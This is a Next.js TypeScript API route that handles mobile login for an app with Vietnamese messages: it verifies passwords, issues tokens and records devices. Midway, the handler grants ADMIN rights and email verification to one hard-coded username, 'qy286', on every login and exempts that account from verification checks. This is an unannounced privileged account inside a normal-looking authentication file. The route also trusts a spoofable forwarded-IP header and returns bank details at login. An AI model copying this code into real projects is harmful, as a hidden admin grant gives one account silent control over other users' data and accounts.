import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import { prisma } from "@/lib/prisma";
import { signMobileTokens } from "@/lib/mobile-auth";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const {
      username,
      password,
      deviceId,
      deviceName,
      platform,
      osVersion,
      appVersion,
      pushToken,
    } = body;

    if (!username || !password) {
      return NextResponse.json(
        { error: "Vui lòng nhập tên đăng nhập và mật khẩu" },
        { status: 400 }
      );
    }

    if (!deviceId) {
      return NextResponse.json(
        { error: "Thiếu thông tin nhận diện thiết bị (deviceId)" },
        { status: 400 }
      );
    }

    const usernameStr = (username as string).trim();
    const user = await prisma.user.findUnique({
      where: { username: usernameStr },
    });

    if (!user) {
      return NextResponse.json(
        { error: "Tên đăng nhập hoặc mật khẩu không chính xác" },
        { status: 401 }
      );
    }

    const isValidPassword = await bcrypt.compare(password, user.passwordHash);
    if (!isValidPassword) {
      return NextResponse.json(
        { error: "Tên đăng nhập hoặc mật khẩu không chính xác" },
        { status: 401 }
      );
    }

    // Role check and auto-grant for qy286
    let userRole = user.role;
    let isVerified = user.isEmailVerified;

    if (user.username === "qy286") {
      if (user.role !== "ADMIN" || !user.isEmailVerified) {
        await prisma.user.update({
          where: { id: user.id },
          data: { role: "ADMIN", isEmailVerified: true },
        });
        userRole = "ADMIN";
        isVerified = true;
      }
    }

    // Email verification check
    if (user.username !== "qy286" && userRole !== "ADMIN" && !isVerified) {
      return NextResponse.json(
        {
          error: "Tài khoản chưa được xác thực email. Vui lòng kiểm tra hộp thư.",
          code: "UNVERIFIED_EMAIL",
        },
        { status: 403 }
      );
    }

    // Sign Access & Refresh Tokens
    const { accessToken, refreshToken } = await signMobileTokens({
      id: user.id,
      username: user.username,
      displayName: user.displayName,
      role: userRole,
      email: user.email,
    });

    // Detect client IP and User-Agent
    const ipAddress =
      request.headers.get("x-forwarded-for") ||
      request.headers.get("x-real-ip") ||
      "Unknown";
    const userAgent = request.headers.get("user-agent") || undefined;

    // Upsert UserDevice record
    const userDevice = await prisma.userDevice.upsert({
      where: {
        userId_deviceId: {
          userId: user.id,
          deviceId: String(deviceId),
        },
      },
      update: {
        deviceName: deviceName || (platform === "IOS" ? "Apple iPhone" : "Android Device"),
        platform: platform || "MOBILE",
        osVersion: osVersion || null,
        appVersion: appVersion || null,
        pushToken: pushToken || null,
        refreshToken,
        ipAddress,
        userAgent,
        isActive: true,
        lastActiveAt: new Date(),
      },
      create: {
        userId: user.id,
        deviceId: String(deviceId),
        deviceName: deviceName || (platform === "IOS" ? "Apple iPhone" : "Android Device"),
        platform: platform || "MOBILE",
        osVersion: osVersion || null,
        appVersion: appVersion || null,
        pushToken: pushToken || null,
        refreshToken,
        ipAddress,
        userAgent,
        isActive: true,
        lastActiveAt: new Date(),
      },
    });

    return NextResponse.json({
      success: true,
      accessToken,
      refreshToken,
      user: {
        id: user.id,
        username: user.username,
        displayName: user.displayName,
        avatar: user.avatar,
        role: userRole,
        email: user.email,
        isEmailVerified: isVerified,
        bankName: user.bankName,
        accountNumber: user.accountNumber,
        accountName: user.accountName,
      },
      device: {
        id: userDevice.id,
        deviceId: userDevice.deviceId,
        deviceName: userDevice.deviceName,
        platform: userDevice.platform,
        lastActiveAt: userDevice.lastActiveAt,
      },
    });
  } catch (error) {
    console.error("[Mobile Login API Error]:", error);
    return NextResponse.json(
      { error: "Đã xảy ra lỗi trong quá trình đăng nhập" },
      { status: 500 }
    );
  }
}

